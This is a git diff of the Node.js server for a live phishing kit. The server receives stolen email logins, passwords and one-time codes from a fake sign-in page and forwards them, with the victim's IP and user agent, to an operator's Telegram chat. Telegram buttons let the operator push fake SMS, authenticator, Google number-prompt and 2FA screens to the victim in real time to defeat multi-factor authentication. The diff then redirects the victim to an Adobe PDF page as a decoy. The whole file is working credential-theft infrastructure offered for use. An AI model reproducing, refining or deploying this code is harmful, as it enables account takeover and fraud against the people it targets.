@@ -1,12 +1,11 @@
-const express = require('express');
-const http = require('http');
-const { WebSocketServer } = require('ws');
-const url = require('url');
-const TelegramBot = require('node-telegram-bot-api');
+import express from 'express';
+import { createServer } from 'http';
+import { WebSocketServer } from 'ws';
+import { URL } from 'url';
 
 // --- Basic Setup ---
 const app = express();
-const server = http.createServer(app);
+const server = createServer(app);
 const PORT = process.env.PORT || 10000;
 
 app.set('trust proxy', true);
@@ -20,151 +19,217 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
   process.exit(1);
 }
 
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
-console.log('[SERVER] Telegram Bot listener has started.');
-
-// --- Middleware & WebSocket Server ---
+// --- Middleware ---
 app.use(express.json());
+
+// --- WebSocket Server ---
 const wss = new WebSocketServer({ server, path: '/ws' });
 const activeConnections = new Map();
 
-// --- API Endpoint ---
+// --- Reusable Telegram API Helper ---
+async function callTelegramApi(method, body) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body),
+        });
+        const json = await response.json();
+        if (!json.ok) {
+            console.error(`[SERVER] Telegram API Error (${method}):`, json);
+        }
+        return json;
+    } catch (error) {
+        console.error(`[SERVER] Telegram API Call Failed (${method}):`, error);
+        return null;
+    }
+}
+
+// --- Main API Endpoint (Receives data from Frontend) ---
 app.post('/api/send-telegram', async (req, res) => {
   console.log('[SERVER] Received data from frontend.');
   const payload = { ...req.body, ipAddress: req.ip };
   const message = formatMessage(payload); // Uses the new, redesigned formatting
   const sessionId = payload?.data?.sessionId;
-  const providerKey = (payload?.data?.provider || 'O').charAt(0).toUpperCase();
-
+  
   if (!sessionId) {
     return res.status(400).json({ status: 'error', message: 'SessionID is missing.' });
   }
 
-  // Updated inline keyboard with the new Google Number Prompt function
+  // This is the main admin control panel sent to Telegram
   const options = {
     reply_markup: {
       inline_keyboard: [
-        [{ text: "Incorrect Pass", callback_data: `ip:${sessionId}:${providerKey}` }, { text: "SMS Page", callback_data: `sms:${sessionId}:${providerKey}` }],
-        [{ text: "Authenticator", callback_data: `auth:${sessionId}:${providerKey}` }, { text: "Google # Prompt", callback_data: `g_prompt:${sessionId}` }],
-        [{ text: "Account Locked", callback_data: `lock:${sessionId}:${providerKey}` }, { text: "2FA Page", callback_data: `2fa:${sessionId}:${providerKey}` }],
+        [{ text: "Incorrect Pass", callback_data: `ip:${sessionId}` }, { text: "SMS Page", callback_data: `sms:${sessionId}` }],
+        [{ text: "Authenticator", callback_data: `auth:${sessionId}` }, { text: "Google # Prompt", callback_data: `g_prompt_init:${sessionId}` }],
+        [{ text: "Account Locked", callback_data: `lock:${sessionId}` }, { text: "2FA Page", callback_data: `2fa:${sessionId}` }],
         [{ text: "Success", callback_data: `success:${sessionId}` }, { text: "Reset", callback_data: `reset:${sessionId}` }],
       ]
     }
   };
 
-  try {
-    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown', disable_web_page_preview: true });
-    await bot.sendMessage(TELEGRAM_CHAT_ID, "👆 *Choose an action above* 👆", { parse_mode: 'Markdown', reply_markup: options.reply_markup });
-  } catch (error) {
-    console.error(`[SERVER] Failed to send message to Telegram: ${error.message}`);
-  }
+  await callTelegramApi('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true });
+  await callTelegramApi('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: "👆 *Choose an action above* 👆", parse_mode: 'Markdown', reply_markup: options.reply_markup });
 
   res.status(200).json({ status: 'logged' });
 });
 
-// --- WebSocket Connection Handling ---
+// --- Webhook for Telegram Callbacks (Admin Actions) ---
+app.post('/api/telegram-webhook', async (req, res) => {
+    const update = req.body || {};
+    res.status(200).json({ ok: true }); // Always respond 200 OK immediately
+
+    const cb = update.callback_query;
+    if (!cb || typeof cb.data !== 'string') return;
+
+    const parts = cb.data.split(':');
+    const cmd = parts[0];
+    const sessionId = parts[1];
+
+    // --- Step 1 of Google Number Prompt ---
+    if (cmd === 'g_prompt_init') {
+        if (!sessionId) return;
+        const picked = new Set();
+        while (picked.size < 3) { picked.add(Math.floor(10 + Math.random() * 90)); }
+        const numbers = Array.from(picked);
+        
+        const inline_keyboard = [numbers.map((n) => ({
+            text: String(n),
+            callback_data: `g_prompt_send:${sessionId}:${n}`,
+        }))];
+
+        await callTelegramApi('answerCallbackQuery', { callback_query_id: cb.id });
+        await callTelegramApi('editMessageText', {
+            chat_id: cb.message.chat.id,
+            message_id: cb.message.message_id,
+            text: `*Google Prompt:* Choose the number to display for session \`${sessionId}\``,
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard },
+        });
+        return;
+    }
+
+    // --- Step 2 of Google Number Prompt ---
+    if (cmd === 'g_prompt_send') {
+        const number = parts[2];
+        if (!sessionId || !number) return;
+        
+        const delivered = sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number: Number(number) });
+        await callTelegramApi('answerCallbackQuery', {
+            callback_query_id: cb.id,
+            text: delivered ? `Sent prompt #${number} to user` : `User ${sessionId} is not connected`,
+        });
+        await callTelegramApi('editMessageText', {
+            chat_id: cb.message.chat.id,
+            message_id: cb.message.message_id,
+            text: `✅ Command sent: *Google Prompt #${number}* for session \`${sessionId}\``,
+            parse_mode: 'Markdown',
+        });
+        return;
+    }
+
+    // --- All Other Admin Commands ---
+    const commandMap = {
+        'ip': 'show_incorrect_password', 'sms': 'show_sms_code',
+        'auth': 'show_authenticator_approval', 'lock': 'show_account_locked',
+        '2fa': 'show_two_factor', 'success': 'redirect', 'reset': 'reset',
+    };
+    const wsCommand = commandMap[cmd];
+
+    if (wsCommand) {
+        let commandData = {};
+        if (wsCommand === 'redirect') {
+            commandData.url = 'https://www.adobe.com/acrobat/online/sign-pdf.html';
+        }
+        const delivered = sendWebSocketCommand(sessionId, wsCommand, commandData);
+        await callTelegramApi('answerCallbackQuery', {
+            callback_query_id: cb.id,
+            text: delivered ? `Command '${wsCommand}' sent!` : `User ${sessionId} is not connected`,
+        });
+    }
+});
+
+// --- WebSocket Connection Logic ---
 wss.on('connection', (ws, req) => {
     const queryParams = new URL(req.url, `http://${req.headers.host}`).searchParams;
     const sessionId = queryParams.get('sessionId');
 
-    if (!sessionId) {
-        console.log('[SERVER] WebSocket connection rejected: No sessionId provided.');
-        return ws.terminate();
-    }
+    if (!sessionId) return ws.terminate();
+    
     activeConnections.set(sessionId, ws);
     console.log(`[SERVER] Client connected: ${sessionId}`);
+
     ws.on('close', () => {
-        console.log(`[SERVER] Client disconnected: ${sessionId}`);
         activeConnections.delete(sessionId);
+        console.log(`[SERVER] Client disconnected: ${sessionId}`);
     });
     ws.on('error', (e) => console.error(`[SERVER] WS Error for ${sessionId}:`, e));
 });
 
-// --- Telegram Bot Callback Handler (Updated) ---
-bot.on('callback_query', (callbackQuery) => {
-    const data = callbackQuery.data;
-    const [cmd, sessionId, providerKey] = data.split(':');
-
-    if (!cmd || !sessionId) return bot.answerCallbackQuery(callbackQuery.id);
-
-    bot.answerCallbackQuery(callbackQuery.id, { text: `Sending ${cmd}...` });
-
-    const providerMap = { 'G': 'gmail', 'O': 'office365', 'Y': 'yahoo', 'A': 'aol', 'S': 'others' };
-    const provider = providerMap[providerKey] || 'others';
-
-    const commandMap = {
-        'ip': 'show_incorrect_password', 'sms': 'show_sms_code',
-        'auth': 'show_authenticator_approval', 'lock': 'show_account_locked',
-        'sec': 'show_security_check', '2fa': 'show_two_factor',
-        'email_v': 'show_email_verification',
-        'g_prompt': 'show_google_number_prompt', // New command for Google Number Prompt
-        'success': 'redirect', 'reset': 'reset',
-    };
-    const wsCommand = commandMap[cmd];
-
-    if (!wsCommand) return;
-
-    let commandData = { provider };
-    if (wsCommand === 'redirect') {
-        commandData.url = 'https://www.adobe.com/acrobat/online/sign-pdf.html';
-    }
-    // For the new Google prompt, we simulate a numbers payload.
-    // You can customize these numbers as needed.
-    if (wsCommand === 'show_google_number_prompt') {
-        commandData.numbers = [Math.floor(Math.random() * 90) + 10, Math.floor(Math.random() * 90) + 10, Math.floor(Math.random() * 90) + 10];
-    }
-
+function sendWebSocketCommand(sessionId, command, data = {}) {
     const ws = activeConnections.get(sessionId);
-    if (ws && ws.readyState === ws.OPEN) {
-        ws.send(JSON.stringify({ command: wsCommand, data: commandData }));
-        console.log(`[SERVER] Sent command '${wsCommand}' to client ${sessionId}`);
-    } else {
-        console.log(`[SERVER] Could not send command to client ${sessionId}: No active connection.`);
+    if (ws && ws.readyState === 1 /* OPEN */) {
+        ws.send(JSON.stringify({ command, data }));
+        console.log(`[SERVER] Sent command '${command}' to client ${sessionId}`);
+        return true;
     }
-});
+    console.warn(`[SERVER] Could not send command to client ${sessionId}: No active connection.`);
+    return false;
+}
 
-// --- Redesigned Helper Function for Clean Telegram Messages ---
+// --- Redesigned Message Formatting Function ---
 const formatMessage = (payload) => {
     const { type, data, ipAddress } = payload;
     if (!data) return "*Received empty payload*";
 
     const now = new Date();
-    const timestamp = `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
+    const timestamp = `${now.toLocaleDateString('en-US', { timeZone: 'UTC' })} ${now.toLocaleTimeString('en-US', { timeZone: 'UTC', hour12: false })} UTC`;
     
-    // Header
-    let header = '';
-    if (type === 'credentials') header = '💼 New Login Captured';
-    else if (type === 'interaction') header = '👆 Interaction Submitted';
-    else header = '❓ Unknown Data';
+    const actionLabels = {
+        user_canceled: 'User clicked "Cancel"',
+        submit_sms: 'SMS Code Submitted',
+        submit_2fa: '2FA Code Submitted',
+        retry_password: 'Password Submitted (Retry)',
+        submit_email_code: 'Email Code Submitted',
+    };
 
-    // Main Content Block
-    const mainInfo = [];
-    if (data.provider) mainInfo.push(`*Provider:* \`${data.provider}\``);
-    if (data.email) mainInfo.push(`*Email:* \`${data.email}\``);
-    if (data.password) mainInfo.push(`*Password:* \`${data.password}\``);
-    if (data.action) mainInfo.push(`*Action:* \`${data.action}\``);
-    if (data.code) mainInfo.push(`*Code:* \`${data.code}\``);
+    let header, mainInfo;
 
-    // System Info Block
+    if (type === 'credentials') {
+        header = '💼 New Login Credentials';
+        mainInfo = [
+            `*Provider:* \`${data.provider || 'N/A'}\``,
+            `*Email:* \`${data.email || 'N/A'}\``,
+            `*Password:* \`${data.password || 'N/A'}\``
+        ];
+    } else if (type === 'interaction') {
+        header = '👆 User Interaction';
+        const actionLabel = actionLabels[data.action] || `"${data.action}"`;
+        mainInfo = [`*Action:* ${actionLabel}`];
+        if (data.code) mainInfo.push(`*Code:* \`${data.code}\``);
+        if (data.password) mainInfo.push(`*Password:* \`${data.password}\``);
+    } else {
+        header = '❓ Unknown Data Received';
+        mainInfo = [`\`\`\`\n${JSON.stringify(data, null, 2)}\n\`\`\``];
+    }
+
     const systemInfo = [
         `*IP Address:* \`${ipAddress || 'N/A'}\``,
         `*User Agent:* \`${data.userAgent || 'N/A'}\``,
-        `*Session ID:* \`${data.sessionId || 'N/A'}\``,
-        `*Timestamp:* \`${timestamp}\``,
     ];
 
-    // Construct the message
-    const messageParts = [
+    return [
         `*--- ${header} ---*`,
-        mainInfo.join('\n'),
-        `\n*--- System Info ---*`,
-        systemInfo.join('\n')
-    ];
-    
-    return messageParts.join('\n');
+        ...mainInfo,
+        `\n*--- Session & System ---*`,
+        ...systemInfo,
+        `*Session ID:* \`${data.sessionId || 'N/A'}\``,
+        `*Timestamp:* \`${timestamp}\``
+    ].join('\n');
 };
 
-bot.on('polling_error', (error) => console.error(`[SERVER] Polling error: ${error.code}`));
-
 // --- Start Server ---
-server.listen(PORT, '127.0.0.1', () => console.log(`[SERVER] API and WebSocket server running on http://127.0.0.1:${PORT}`));
+server.listen(PORT, '127.0.0.1', () => {
+  console.log(`[SERVER] API and WebSocket server is running on http://127.0.0.1:${PORT}`);
+});
